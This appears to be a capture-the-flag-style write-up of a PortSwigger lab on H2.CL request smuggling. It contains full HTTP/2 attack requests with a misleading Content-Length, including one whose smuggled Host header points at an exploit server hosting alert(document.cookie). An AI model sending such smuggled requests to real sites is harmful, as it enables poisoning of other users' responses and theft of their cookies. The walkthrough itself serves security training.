# H2.CL request smuggling

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling), you'll learn: H2.CL request smuggling! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling `alert(document.cookie)`. The victim user accesses the home page every 10 seconds.

> Note:
>  
> This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override) option and manually [change the protocol to HTTP/2 using the Inspector](https://portswigger.net/burp/documentation/desktop/http2#changing-the-protocol-for-a-request).
>  
> Please note that this feature is only available from [Burp Suite Professional / Community 2021.9.1](https://portswigger.net/burp/releases).

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214172445.png)

**View source page:**
```html
[...]
<script type="text/javascript" src="/resources/js/analyticsFetcher.js"></script>
[...]
```

**As you can see, it loaded a JavaScript file from `/resources/js/analyticsFetcher.js`:**
```js
setTimeout(() => {
    const script = document.createElement('script');
    document.body.appendChild(script);
    uid = Math.random().toString(10).substr(2, 10);
    script.src = '/resources/js/analytics.js?uid=' + uid;
}, 5000);
```

What this JavaScript will do is:

- After 5 seconds, create a new `<script>` element
- Append it to the HTML body
- Generate a pseudo-random user ID
- Finally, **set the `<script>` element's `src` attribute to `/resources/js/analytics.js`, and the GET parameter: generated user ID**

**Hmm... What's that `/resources/js/analytics.js` doing?**
```js
function randomString(length, chars) {
    var result = '';
    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
}
var id = randomString(16, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
fetch('/analytics?id=' + id)
```

This JavaScript will:

- Generate a pseudo-random ID
- Send a GET request to `/analytics` with parameter `id`, and value pseudo-random ID

Armed with above information, we can ***try to exploit response queue poisoning, which will then import our evil JavaScript!***

In HTTP/2 (HTTP version 2), requests don't have to specify their length explicitly in a header. During downgrading, this means front-end servers often add an HTTP/1 `Content-Length` header, deriving its value using [HTTP/2's built-in length mechanism](https://portswigger.net/web-security/request-smuggling/advanced#http-2-message-length). Interestingly, HTTP/2 requests can also include their own `content-length` header. In this case, some front-end servers will simply reuse this value in the resulting HTTP/1 request.

The spec dictates that any `content-length` header in an HTTP/2 request must match the length calculated using the built-in mechanism, but this isn't always validated properly before downgrading. As a result, it may be possible to smuggle requests by injecting a misleading `content-length` header. Although the front-end will use the implicit HTTP/2 length to determine where the request ends, the HTTP/1 back-end has to refer to the `Content-Length` header derived from our injected one, resulting in a desync.

Therefore, we can try to smuggle HTTP request via **HTTP/2 downgrading**:

> Note: This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, we need to enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override) option and manually [change the protocol to HTTP/2 using the Inspector](https://portswigger.net/burp/documentation/desktop/http2#changing-the-protocol-for-a-request).

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214174241.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214174333.png)

Then, change the request method to POST:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214174309.png)

We assume the web application's front-end is using HTTP/2, and the back-end is using CL (`Content-Length` header).

- H2.CL:

**Now, we can send the folllowing attack request:**
```http
POST / HTTP/2
Host: 0a42003e03d51d61c02d0feb00e80099.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /404pls HTTP/1.1
Host: 0a42003e03d51d61c02d0feb00e80099.web-security-academy.net
Content-Length: 25

smuggled=yes
```

> Note: To send that request, you must disable "Update Content-Length" option in Burp Suite's Repeater
>  
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214175032.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214175050.png)

When we send the request twice, it returns a 404 status! Which means **we can confirm that the web application is vulnerable to H2.CL HTTP request smuggling!**

But, how can we escalate that vulnerability to much more critical?

**After poking around, I found something interesting:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214180409.png)

When we go to `/resources/js`, it'll redirect us to `/resources/js/`.

Hmm... I wonder if can we control the host...

**Let's try to change the `Host` header to anything:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214180505.png)

Oh!! We can indeed control the host!

That being said, **What if we import an evil JavaScript from the exploit server?**

**To do so, let's head over to the exploit server, and host the payload with path `/resources/js`:**
```js
alert(document.cookie);
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214180720.png)

**Then, send the attack request again but with the exploit server's `Host`:**
```http
POST / HTTP/2
Host: 0a42003e03d51d61c02d0feb00e80099.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources/js HTTP/1.1
Host: exploit-0afa0058031b1d5bc0ff0c4301580060.exploit-server.net
Content-Length: 25

smuggled=yes
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214180851.png)

Exploit server access log:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214180910.png)

As you can see, our victim successfully imported our evil JavaScript!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214182628.png)

What the victim will see:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-12/images/Pasted%20image%2020230214181416.png)

> Note: You need to poison the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, it will fetch your payload from the exploit server but not execute it. You may need to repeat the attack several times before you get the timing right.
>  
> You could try to keep spamming the attack request.

# What we've learned:

1. H2.CL request smuggling